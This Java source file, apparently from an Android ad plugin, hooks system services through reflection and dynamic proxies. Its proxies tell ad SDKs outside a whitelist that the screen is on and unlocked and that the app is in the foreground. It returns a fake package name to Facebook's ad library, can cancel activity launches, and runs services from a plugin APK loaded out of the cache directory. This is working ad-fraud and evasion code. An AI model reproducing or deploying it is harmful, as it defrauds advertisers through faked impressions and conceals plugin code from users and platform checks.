package com.cp.facebook.hook;

import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.PowerManager;
import android.os.Process;
import android.text.TextUtils;

import com.cp.facebook.util.Constant;
import com.cp.facebook.util.Logger;
import com.cp.facebook.util.ReflectAccess;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.StringTokenizer;

public class Hooker {
    public static class Handle {
        public boolean IsCancel = false;
    }

    public interface OnActivityManagerHooker {
        void onStartActivity(Intent intent, Handle handle);
    }

    private static List<OnActivityManagerHooker> _list = new ArrayList<OnActivityManagerHooker>();
    private static Object activityManagerProxy;
    private static Object handlerCallback;
    private static OnActivityManagerHooker managerHooker;
    private static Context _context;

    private static Object powerManagerProxy;
    private static Object keyguardManagerProxy;

    private static String[] ownClass = {"com.plug.common.CommonUtil",
            "com.core.Utils",
            "com.demo.facebookdemo.sdkmodel.Utils",
            "com.sdk_tea.cup.AdmobSdkProvider",
            "com.core.AppChecker",
            "com.sdkplug.plugininmobi.util.Utils",
            "com.lgplug.baidu.sdkmodel.Utils",
            "com.omgSdk.commen.Utils",
            "com.example.sdkpluginmobvista.sdk.Utils",
            "com.sdkplug.pluginchartboost.util.Utils",
            "com.demo.vungle.sdkmodel.Utils",
            "com.sdkplug.pluginnext.util.Utils",
            "com.demo.applovin.sdkmodel.Utils",
            "sdk.plugin.altamob.sdkmodel.Utils",
            "com.api.utils.sdk.Utils",
            "com.sdk_tea.cup.sdkmodel.Utils"};;

    private static String needChange = "AZeroPlug,FSixPlug";

    public static void addHocker(OnActivityManagerHooker hooker) {
        _list.add(hooker);
    }

    public static void clearHock() {
        if (!_list.isEmpty()) {
            _list.clear();
        }
    }

    public static void hook(Context context) {
        _context = context.getApplicationContext();
        hook(_context, new OnActivityManagerHooker() {
            @Override
            public void onStartActivity(Intent intent, Handle handle) {
                for (OnActivityManagerHooker hooker : _list) {
                    hooker.onStartActivity(intent, handle);
                }
            }
        });
    }

    public static void hookKeyguard(Context context) {
        try {
            if (Build.VERSION.SDK_INT > 22) {
                KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
                Field mWMField = km.getClass().getDeclaredField("mWM");
                mWMField.setAccessible(true);
                Class<?> mWMClass = mWMField.getType();
                final Object kMInstance = ReflectAccess.getValue(km, "mWM");
                if (kMInstance != keyguardManagerProxy) {
                    keyguardManagerProxy = Proxy.newProxyInstance(Hooker.class.getClassLoader(), new Class[]{mWMClass}, new InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                            String currentName = "AZeroPlug";
                            if (TextUtils.isEmpty(currentName)) {
                                currentName = "Unknown";
                            }
                            if ("inKeyguardRestrictedInputMode".equals(method.getName()) && needChange.contains(currentName)) {
                                String caller = getCaller("inKeyguardRestrictedInputMode", 2);
                                if (!isOwnClass(caller)) {
                                    boolean result = (boolean) method.invoke(kMInstance, args);
                                    Logger.i("拦截 keyguardManager 1 = " + result);
                                    if (result) {
                                        Logger.i("拦截 keyguardManager 2 = " + false);
                                        return false;
                                    }
                                    return result;
                                }
                            }
                            return method.invoke(kMInstance, args);
                        }
                    });
                    ReflectAccess.setValue(km, "mWM", keyguardManagerProxy);
                }
            } else {
                String KeyguardGlobal = "android.view.WindowManagerGlobal";
                Field mWMFiled = Class.forName(KeyguardGlobal).getDeclaredField("sWindowManagerService");
                Class<?> mWMFiledClass = mWMFiled.getType();
                final Object kMInstance = Class.forName(KeyguardGlobal)
                        .getDeclaredMethod("getWindowManagerService")
                        .invoke(null);
                final Object instance = Class.forName(KeyguardGlobal)
                        .getDeclaredMethod("getInstance")
                        .invoke(null);

                if (kMInstance != keyguardManagerProxy) {
                    keyguardManagerProxy = Proxy.newProxyInstance(Hooker.class.getClassLoader(), new Class[]{mWMFiledClass}, new InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                            String currentName = "AZeroPlug";
                            if (TextUtils.isEmpty(currentName)) {
                                currentName = "Unknown";
                            }
                            if ("inKeyguardRestrictedInputMode".equals(method.getName()) && needChange.contains(currentName)) {
                                String caller = getCaller("inKeyguardRestrictedInputMode", 2);
                                if (!isOwnClass(caller)) {
                                    boolean result = (boolean) method.invoke(kMInstance, args);
                                    Logger.i("拦截 keyguardManager 1 = " + result);
                                    if (result) {
                                        Logger.i("拦截 keyguardManager 2 = " + false);
                                        return false;
                                    }
                                    return result;
                                }
                            }
                            return method.invoke(kMInstance, args);
                        }
                    });
                    ReflectAccess.setValue(instance, "sWindowManagerService", keyguardManagerProxy);
                }
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static void hookPower(Context context) {
        try {
            PowerManager pow = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            Field ser = pow.getClass().getDeclaredField("mService");
            ser.setAccessible(true);
            Class<?> mServiceFiled = ser.getType();
            final Object iamInstance = ReflectAccess.getValue(pow, "mService");
            if (iamInstance != powerManagerProxy) {
                powerManagerProxy = Proxy.newProxyInstance(Hooker.class.getClassLoader(), new Class[]{mServiceFiled}, new InvocationHandler() {
                    @Override
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        String methodName = method.getName();
                        String currentName = "AZeroPlug";
                        if (TextUtils.isEmpty(currentName)) {
                            currentName = "Unknown";
                        }
                        if (("isScreenOn".equals(methodName) || "isInteractive".equals(methodName)) && needChange.contains(currentName)) {
                            String caller = "";
                            if ("isInteractive".equals(methodName)) {
                                caller = getCaller(methodName, 3);
                            } else if ("isScreenOn".equals(methodName)) {
                                caller = getCaller(methodName, 2);
                            }
                            if (!isOwnClass(caller)) {
                                boolean res = (boolean) method.invoke(iamInstance, args);
                                Logger.i("拦截 isScreenOn 1 = " + res);
                                if (!res) {
                                    Logger.i("拦截 isScreenOn 2 = " + true);
                                    return true;
                                }
                                return res;
                            }
                        }
                        return method.invoke(iamInstance, args);
                    }
                });
                ReflectAccess.setValue(pow, "mService", powerManagerProxy);
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
    }

    public static void hook(Context context, OnActivityManagerHooker _hocker) {
        _context = context.getApplicationContext();
        managerHooker = _hocker;
        try {
            Class<?> ia = Class.forName("android.app.IActivityManager");
            if (Build.VERSION.SDK_INT >= 26) {
                Object iamSingleton = ReflectAccess.getValue(Class.forName("android.app.ActivityManager"), "IActivityManagerSingleton");
                Object iamInstance = ReflectAccess.getValue(iamSingleton, "mInstance");
                if (iamInstance != activityManagerProxy) {
                    activityManagerProxy = getActivityManagerProxy(iamInstance, ia);
                    ReflectAccess.setValue(iamSingleton, "mInstance", activityManagerProxy);
                }
            } else {
                Object v = ReflectAccess.getValue("android.app.ActivityManagerNative", "gDefault");
                if (v.getClass().isAssignableFrom(ia)) {
                    if (v != activityManagerProxy) {
                        activityManagerProxy = getActivityManagerProxy(v, ia);
                        ReflectAccess.setValue("android.app.ActivityManagerNative", "gDefault", activityManagerProxy);
                    }
                } else {
                    Object m = ReflectAccess.getValue(v, "mInstance");
                    if (m != activityManagerProxy) {
                        activityManagerProxy = getActivityManagerProxy(m, ia);
                        ReflectAccess.setValue(v, "mInstance", activityManagerProxy);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static boolean isHook(String className) {
        if ("com.view.sdk.imp.CollectParameterActivity".equals(className)) {
            return true;
        }
        String[] activityNames = Constant._hookAdsActivitys;
        if (activityNames == null || activityNames.length == 0) {
            Logger.i("没有设置拦截activityNames");
            return false;
        } else {
            for (int i = 0; i < activityNames.length; i++) {
                Logger.i("拦截activityNames[i] = " + activityNames[i]);
                if (activityNames[i].equalsIgnoreCase(className)) {
                    return true;
                }
            }
        }
        return false;
    }

    private static Object getActivityManagerProxy(final Object host, Class<?> ia) {
        return Proxy.newProxyInstance(Hooker.class.getClassLoader(), new Class<?>[]{ia}, new InvocationHandler() {
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                String currentName = "AZeroPlug";
                if (TextUtils.isEmpty(currentName)) {
                    currentName = "Unknown";
                }
                if ("getRunningAppProcesses".equals(method.getName()) && needChange.contains(currentName)) {
                    List<ActivityManager.RunningAppProcessInfo> var4 = (List) method.invoke(host, args);
                    if (var4 != null) {
                        Iterator var5 = var4.iterator();
                        while (var5.hasNext()) {
                            ActivityManager.RunningAppProcessInfo var6 = (ActivityManager.RunningAppProcessInfo) var5.next();
                            if (Process.myPid() == var6.pid) {
                                Logger.i("拦截 importance 1 = " + var6.importance);
                                String caller = getCaller(method.getName(), 2);
                                if (!isOwnClass(caller)) {
                                    if (var6.importance != 100) {
                                        var6.importance = 100;
                                        Logger.i("拦截 importance 2 = " + 100);
                                    }
                                }
                            }
                        }
                    }
                    return var4;
                }
                if ("startActivity".equals(method.getName())) {
                    for (int i = 0; i < args.length; i++) {
                        Object arg = args[i];
                        if (arg instanceof Intent) {
                            Intent intent = (Intent) arg;
                            Logger.i("invoke intent = " + intent.toString());
//                            if (intent.getComponent() != null) {
//                                //使用在manifest中申明的activity伪装真实的没有申明的activity
//                                String className = intent.getComponent().getClassName();
//                                Logger.i("invoke className = " + className);
//
//                                if (isHook(className)) {
//                                    Intent proxyIntent = new Intent();
//                                    if (intent.getComponent().getClassName().contains("com.duapps")) {
//                                        proxyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
//                                    } else {
//                                        proxyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
//                                    }
//                                    Logger.i("Hook packageName = " + intent.getComponent().getPackageName());
//                                    Logger.i("Hook className = " + RunInfo.get(_context).get("HolderActivity", "com.view.sdk.AdsHolderActivity"));
//                                    proxyIntent.setClassName(intent.getComponent().getPackageName(), RunInfo.get(_context).get("HolderActivity", "com.view.sdk.AdsHolderActivity"));
//                                    proxyIntent.putExtra("oldIntent", intent);
//                                    args[i] = proxyIntent;
//                                    return method.invoke(host, args);
//                                }
//                            }
                            String installType = "application/vnd.android.package-archive";
                            if (managerHooker != null && !installType.equals(intent.getType())) {
                                Handle handle = new Handle();
                                managerHooker.onStartActivity(intent, handle);
                                Logger.i("handle 的值是不是被修改了 " + handle.IsCancel);
                                if (handle.IsCancel) {
                                    if (method.getReturnType().toString().startsWith("int")) {
                                        return 0;
                                    } else {
                                        return null;
                                    }
                                }
                            }

                            break;
                        }
                    }
                }
                if ("getPackageForIntentSender".equals(method.getName())) {
                    Logger.i("element = Chen SSSSSSSSSSSSSS");
                    for (StackTraceElement element : Thread.currentThread().getStackTrace()) {
                        Logger.i("element = " + element.toString());
                    }
                    for (StackTraceElement element : Thread.currentThread().getStackTrace()) {
                        if (element.getClassName().contains("com.facebook.ads.internal.l.b")) {
                            String packageName = Constant._fakePackageName;
                            if (!TextUtils.isEmpty(packageName)) {
                                return packageName;
                            }
                        }
                    }
                }
                return method.invoke(host, args);
            }

            private boolean handleService(Object[] args, String serviceMethod) {
                for (int i = 0; i < args.length; i++) {
                    Object arg = args[i];
                    if (arg instanceof Intent) {
                        Intent intent = (Intent) arg;
                        Logger.i(serviceMethod + " invoke intent = " + intent.toString());
                        if (intent.getComponent() != null) {
                            //使用在manifest中申明的activity伪装真实的没有申明的activity
                            String className = intent.getComponent().getClassName();
                            Logger.i(serviceMethod + " invoke className = " + className);
                            String pluginName = "AZeroPlug";
                            if (TextUtils.isEmpty(pluginName) || !pluginName.contains("Plug")) {
                                return false;
                            }

                            String filesDir = _context.getCacheDir().getAbsolutePath();
                            String libPath = filesDir + File.separator + pluginName + ".apk";
                            PackageInfo packageInfo = _context.getApplicationContext().getPackageManager()
                                    .getPackageArchiveInfo(libPath, PackageManager.GET_SERVICES);
                            if (packageInfo == null) {
                                return false;
                            }
                            ServiceInfo[] serviceInfos = packageInfo.services;
                            if (serviceInfos == null || serviceInfos.length < 1) {
                                return false;
                            }
                            for (int j = 0; j < serviceInfos.length; j++) {
                                if (className.equals(serviceInfos[j].name)) {
                                    switch (serviceMethod) {
                                        case "startService":
                                            ServiceManager.startService(_context, intent, serviceInfos[j]);
                                            break;
                                        case "stopService":
                                            ServiceManager.stopService(_context, intent, serviceInfos[j]);
                                            break;
                                        case "bindService":
                                            ServiceManager.bindService(_context, intent, serviceInfos[j], args[4]);
                                            break;
                                    }
                                    return true;
                                }
                            }
                        }
                    }
                }
                return false;
            }
        });
    }

    //使用真实的activity
    public static void hookSystemHandler() {
        try {

            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Method currentActivityThreadMethod = activityThreadClass.getDeclaredMethod("currentActivityThread");
            currentActivityThreadMethod.setAccessible(true);
            //获取主线程对象
            Object activityThread = currentActivityThreadMethod.invoke(null);
            //获取mH字段
            Field mH = activityThreadClass.getDeclaredField("mH");
            mH.setAccessible(true);
            //获取Handler
            Handler handler = (Handler) mH.get(activityThread);
            //获取原始的mCallBack字段
            Field mCallBack = Handler.class.getDeclaredField("mCallback");
            mCallBack.setAccessible(true);
            //这里设置了我们自己实现了接口的CallBack对象
            if (handler != handlerCallback) {
                handlerCallback = new ActivityThreadHandlerCallback(handler);
                mCallBack.set(handler, handlerCallback);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getCaller(String methodName, int deep) {
        Context var20 = _context.getApplicationContext();
        String var19 = "";
        if (var20 != null && !TextUtils.isEmpty(methodName)) {
            String var21 = var20.getPackageName();
            var19 = zza(Thread.currentThread().getStackTrace(), var21, methodName, deep);
            Logger.i("var19 = " + var19 + " method = " + methodName + " deep = " + deep);
        }
        return var19;
    }

    private static String zza(StackTraceElement[] var1, String var2, String methodName, int deep) {
        String var3 = null;

        for (int var4 = 0; var4 + 1 < var1.length; ++var4) {
            StackTraceElement var5 = var1[var4];
            String var6 = var5.getClassName();
            String var7 = var5.getMethodName();
            //&& (zzXV.equalsIgnoreCase(var6) || zzXW.equalsIgnoreCase(var6) || zzXX.equalsIgnoreCase(var6) || zzXY.equalsIgnoreCase(var6) || zzXZ.equalsIgnoreCase(var6) || zzYa.equalsIgnoreCase(var6))
            if (methodName.equalsIgnoreCase(var7)) {
                var3 = var1[var4 + deep].getClassName();
                break;
            }
        }

        if (var2 != null) {
            String var8 = zzb(var2, ".", 4);
            if (var3 != null && !var3.contains(var8)) {
                return var3;
            }
        }

        return null;
    }

    private static String zzb(String var1, String var2, int var3) {
        StringTokenizer var4 = new StringTokenizer(var1, var2);
        StringBuilder var5 = new StringBuilder();
        if (var3-- > 0 && var4.hasMoreElements()) {
            var5.append(var4.nextToken());

            while (var3-- > 0 && var4.hasMoreElements()) {
                var5.append(".").append(var4.nextToken());
            }
            return var5.toString();
        } else {
            return var1;
        }
    }

    private static boolean isOwnClass(String caller) {
        for (int i = 0; i < ownClass.length; i++) {
            if (caller.contains(ownClass[i])) {
                Logger.i("isOwnClass " + caller + "  true");
                return true;
            }
        }
        Logger.i("isOwnClass " + caller + "  false");
        return false;
    }
}
